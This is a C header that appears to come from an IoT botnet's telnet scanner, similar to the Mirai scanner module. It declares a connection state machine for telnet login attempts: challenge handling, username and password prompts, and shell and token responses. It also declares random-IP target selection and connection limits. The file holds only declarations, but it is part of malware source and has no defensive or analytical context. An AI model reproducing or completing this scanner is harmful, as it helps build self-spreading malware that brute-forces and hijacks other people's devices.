#pragma once

#include <stdint.h>

#include "util.h"

#define PADDED(X) (((X + 7) / 8) * 8)

#define SCANNER_MAX_CONNS   128
#define SCANNER_RAW_PPS     799

#define SCANNER_RDBUF_SIZE  256
#define SCANNER_HACK_DRAIN  64

struct scanner_connection {
    int fd, last_recv, rdbuf_pos;
    enum {
        SC_CLOSED, SC_CONNECTING, SC_DO_CHALLANGE, SC_VERIFY_CHALLANGE,
        SC_VERIFY_TELNET, SC_HANDLE_IACS, SC_WAITING_USERNAME, SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP, SC_WAITING_SHELL_RESP, SC_WAITING_TOKEN_RESP
    } state;

    uint32_t dst_addr;
    uint16_t dst_port;
    char challange_str[128], rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static uint32_t get_random_ip(void);
static int consume_any_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_challange_resp(struct scanner_connection *);
static int consume_verify_resp(struct scanner_connection *);
static int consume_telnet_resp(struct scanner_connection *);
static int consume_iacs(struct scanner_connection *);
static char can_consume(struct scanner_connection *, uint8_t *, int);
